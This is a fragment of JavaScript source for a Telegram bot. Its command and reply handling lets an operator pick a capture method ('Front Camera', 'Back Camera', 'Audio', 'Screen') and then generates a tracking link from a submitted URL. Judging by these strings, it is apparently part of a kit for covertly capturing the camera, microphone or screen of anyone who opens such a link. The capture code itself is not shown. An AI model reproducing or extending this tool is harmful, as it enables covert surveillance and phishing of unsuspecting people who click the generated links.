    if (msg.reply_to_message && msg.reply_to_message.text) {
      const replyText = msg.reply_to_message.text;
      
      // Check if this is a URL input after selecting a capture method
      if (replyText.includes("This will capture:") || 
          replyText.includes("Enter Your URL:") || 
          replyText.includes("Enter URL to track")) {
        console.log("Detected reply to URL prompt:", replyText);
        
        // Find which capture method was selected based on text content
        let methodId = "full"; // Default
        
        if (replyText.includes("Front Camera")) {
          methodId = "full";
        } else if (replyText.includes("Back Camera")) {
          methodId = "back";
        } else if (replyText.includes("Minimal") || replyText.includes("No Camera")) {
          methodId = "minimal";
        } else if (replyText.includes("Audio")) {
          methodId = "audio";
        } else if (replyText.includes("Screen")) {
          methodId = "screen";
        }
        
        console.log("Creating link with method:", methodId);
        // Create a link with the selected capture method
        await createLink(chatId, msg.text, methodId);
        return;
      }
      // Basic URL input handling (backward compatibility)
      else if (replyText === "🌐 Enter Your URL") {
        await createLink(chatId, msg.text);
        return;
      }
    }
    
    // Handle /start command
    if (msg.text === "/start") {
      await sendWelcomeMessage(chatId, msg.chat.first_name);
    }
    // Handle /create command
    else if (msg.text === "/create") {
      await createNew(chatId);
    }
    // Handle /help command
    else if (msg.text === "/help") {
      await sendHelpMessage(chatId);
    }
  });
  
  // Start polling
  bot.startPolling();
  
  // Start the server for the web routes
  app.listen(5000, '0.0.0.0', () => {
    console.log("Server running on port 5000");
  });
}

// Export the handler for serverless deployment
module.exports = app;
module.exports.handler = serverless(app);
